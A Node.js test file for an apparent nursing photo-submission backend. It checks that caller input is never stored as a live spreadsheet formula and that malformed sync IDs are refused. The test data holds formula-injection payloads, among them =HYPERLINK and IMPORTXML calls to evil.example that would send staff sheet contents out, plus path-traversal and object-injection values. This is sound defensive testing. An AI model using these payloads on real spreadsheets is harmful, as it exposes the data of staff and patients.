// verify-submit-input.cjs — what a submission can make the backend write.
// Run: node test/verify-submit-input.cjs
//
// The submit path copies what a phone sent into the Submissions sheet, and
// Praew opens that sheet. Pinned here:
//   1. nothing a caller sends is stored as a live formula. A cell starting
//      with = + - @ runs when the sheet is opened, and =HYPERLINK or
//      =IMPORTXML can carry the sheet's contents somewhere else;
//   2. syncId — the dedupe key, and the Drive file's name — is refused unless
//      it has a shape the app itself mints. Every shape the app mints must
//      still get through: a refused photo sits in the phone's offline queue
//      for good (sync.js keeps anything the server refuses). So the IDs come
//      from the real sync.js, run with and without crypto.randomUUID.
//
// The behavioural tests fail against the revision before the fix:
//
//   NEOREDACT_GAS_SRC=<old Code.gs> node test/verify-submit-input.cjs
//
// Two are guards that pass there too, pinning what the fix must not break:
// an escaped value reads back unchanged, and every ID the app mints is
// accepted.
'use strict';

const assert = require('assert');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { boot, unsignedToken } = require('./gas-stubs.cjs');

const ROOT = path.join(__dirname, '..');
const CLIENT_ID = (fs.readFileSync(path.join(ROOT, 'index.html'), 'utf8')
  .match(/NEOREDACT_CLIENT_ID\s*=\s*"([^"]+)"/) || [])[1];
assert.ok(CLIENT_ID, 'index.html must define NEOREDACT_CLIENT_ID');

const NURSE = 'nurse@example.com';
const ADMIN = 'praew@example.com';
const IMAGE = 'data:image/jpeg;base64,/9j/4AAQSkZJRg==';

// Google vouches for whatever address the token names: who is logged in is
// not what these tests are about (verify-auth.cjs covers that).
function tokenInfoFor(url) {
  const idToken = decodeURIComponent(String(url).split('id_token=')[1] || '');
  const claims = JSON.parse(Buffer.from(idToken.split('.')[1] || '', 'base64url').toString('utf8') || '{}');
  return {
    code: 200,
    body: JSON.stringify({
      aud: CLIENT_ID,
      iss: 'https://accounts.google.com',
      exp: String(Math.floor(Date.now() / 1000) + 3600),
      email_verified: 'true',
      email: claims.email,
    }),
  };
}

function backend() {
  return boot({
    staff: [[ADMIN, 'admin', 'Admin', true, '', ''], [NURSE, 'nurse', 'Nurse', true, '', '']],
    urlFetch: tokenInfoFor,
  });
}

// Every claim present, so the token also passes a revision that only decoded
// it locally (before PR #8) and the tests there fail on what they test.
function login(app, email) {
  const googleToken = unsignedToken({
    iss: 'https://accounts.google.com',
    aud: CLIENT_ID,
    exp: Math.floor(Date.now() / 1000) + 3600,
    email,
    email_verified: true,
  });
  const res = app.post({ action: 'login', googleToken });
  assert.strictEqual(res.status, 'ok', 'setup: ' + email + ' should have logged in (' + res.msg + ')');
  return res.token;
}

// Runs the real sync.js far enough to send one photo and returns the body it
// POSTed — byte for byte what a phone sends. crypto.randomUUID is present or
// not, and Math.random pinned, as the case asks. (app.js mints the artifactId
// that becomes this syncId with the same expression as sync.js's fallback.)
async function postedBySyncJs({ randomUUID, random }) {
  let body = null;
  const stored = new Map();
  const window = {
    NeoRedact: { auth: { getSession: () => ({ token: 'phone-session' }), logout() {} } },
    addEventListener() {}, // the load/online queue flushes are not under test
  };
  const pinnedMath = Object.create(Math);
  if (random !== undefined) pinnedMath.random = () => random;
  const sandbox = {
    window,
    self: {}, // no indexedDB: sync.js would fall back to localStorage
    localStorage: {
      getItem: (k) => (stored.has(k) ? stored.get(k) : null),
      setItem: (k, v) => { stored.set(k, String(v)); },
      removeItem: (k) => { stored.delete(k); },
    },
    crypto: randomUUID ? { randomUUID: () => crypto.randomUUID() } : {},
    Math: pinnedMath,
    Date,
    JSON,
    Promise,
    Object,
    Array,
    String,
    Error,
    NEOREDACT_GAS_URL: 'https://script.google.com/macros/s/under-test/exec',
    fetch: async (_url, init) => {
      body = JSON.parse(init.body);
      return { ok: true, json: async () => ({ status: 'ok' }) };
    },
  };
  vm.createContext(sandbox);
  vm.runInContext(fs.readFileSync(path.join(ROOT, 'sync.js'), 'utf8'), sandbox, { filename: 'sync.js' });
  const result = await window.NeoRedact.sync.syncNow(
    { toDataURL: () => IMAGE }, [{ label: 'Weight', text: '1200' }], '', 'Alpha');
  assert.strictEqual(result.status, 'synced', 'setup: sync.js should have posted the photo');
  return body;
}

let passed = 0;
const failures = [];
const tests = [];
function test(name, fn) { tests.push({ name, fn }); }

// ── 1. Nothing a caller sends becomes a formula ──────────────────────────
const FORMULAS = [
  '=HYPERLINK("https://evil.example/?d="&ENCODEURL(Staff!A2),"open")',
  '+IMPORTXML("https://evil.example/","//a")',
  '-A1+A2',
  '@SUM(A1)',
];

test('a formula sent as ward or capturedAt is stored as text', () => {
  for (const field of ['ward', 'capturedAt']) {
    for (const formula of FORMULAS) {
      const app = backend();
      const token = login(app, NURSE);
      const res = app.post({ action: 'submit', token, syncId: crypto.randomUUID(), codename: 'Alpha', [field]: formula });
      assert.strictEqual(res.status, 'ok', field + ' = ' + formula + ': the submission itself is fine, only how it is stored changes');
      assert.deepStrictEqual(app.env.injections, [],
        field + ' was stored as a live formula, which runs when the sheet is opened');
    }
  }
});

test('an escaped value reads back exactly as it was sent', () => {
  const app = backend();
  const token = login(app, NURSE);
  const ward = FORMULAS[0];
  app.post({ action: 'submit', token, syncId: crypto.randomUUID(), codename: 'Alpha', ward, capturedAt: '+07:00 offset' });
  const res = app.post({ action: 'list_dashboard', token: login(app, ADMIN) });
  assert.strictEqual(res.status, 'ok');
  assert.strictEqual(res.rows[0].ward, ward, 'the admin must see the text the phone sent, not an altered copy');
  assert.strictEqual(res.rows[0].capturedAt, '+07:00 offset');
});

// ── 2. syncId must be one the app mints ──────────────────────────────────
test('a syncId the app would never mint is refused, and nothing is stored', () => {
  const uuid = crypto.randomUUID();
  const refused = [
    ['a formula', '=HYPERLINK("https://evil.example/","open")'],
    ['a path', '../../Staff'],
    ['empty', ''],
    // The fallback's shape, but longer than any clock and Math.random() print.
    ['5000 digits', '9'.repeat(5000)],
    ['a UUID with a formula after it', uuid + '=1+1'],
    ['a UUID with something before it', 'x' + uuid],
    ['a number rather than a string', 12345],
    ['an object', { $ne: '' }],
    ['an array', [uuid]],
  ];
  for (const [what, syncId] of refused) {
    const app = backend();
    const token = login(app, NURSE);
    const res = app.post({ action: 'submit', token, syncId, codename: 'Alpha', redactedImageBase64: IMAGE });
    assert.strictEqual(res.status, 'error', what + ' was answered ' + JSON.stringify(res));
    assert.strictEqual(app.submissionRows().length, 0, what + ': a Submissions row was written');
    assert.strictEqual(app.env.driveFiles.length, 0, what + ': a Drive file was created');
  }
});

test('every syncId the real sync.js mints is accepted', async () => {
  const cases = [
    ['crypto.randomUUID()', { randomUUID: true }],
    ['the fallback, Math.random() = 0.123456789012345', { random: 0.123456789012345 }],
    ['the fallback, Math.random() = 0', { random: 0 }],
    ['the fallback, Math.random() = 0.9999999999999999', { random: 0.9999999999999999 }],
    ['the fallback, Math.random() = 0.000001', { random: 0.000001 }],
    // Below 1e-6 a number prints in exponent form: "…1.5e-7".
    ['the fallback, Math.random() = 1.5e-7', { random: 1.5e-7 }],
    ['the fallback, Math.random() = 5e-7', { random: 5e-7 }],
    ['the fallback, Math.random() = 2^-53', { random: Math.pow(2, -53) }],
  ];
  for (const [what, opts] of cases) {
    const payload = await postedBySyncJs(opts);
    const app = backend();
    const token = login(app, NURSE);
    const res = app.post(Object.assign({}, payload, { token })); // what the phone sends, with a live session
    assert.strictEqual(res.status, 'ok',
      what + ': ' + JSON.stringify(payload.syncId) + ' was refused — that photo would stay queued on the phone for good');
    assert.strictEqual(app.submissionRows()[0][0], payload.syncId, what + ': the row carries the syncId the phone sent');
  }
});

(async () => {
  console.log('\nbackend/Code.gs — what a submission can write\n');
  for (const t of tests) {
    try {
      await t.fn();
      passed++;
      console.log('  ok   ' + t.name);
    } catch (err) {
      failures.push({ name: t.name, err });
      console.log('  FAIL ' + t.name + '\n         ' + err.message.split('\n')[0]);
    }
  }
  console.log('\n' + passed + ' passed, ' + failures.length + ' failed\n');
  process.exit(failures.length ? 1 : 0);
})();
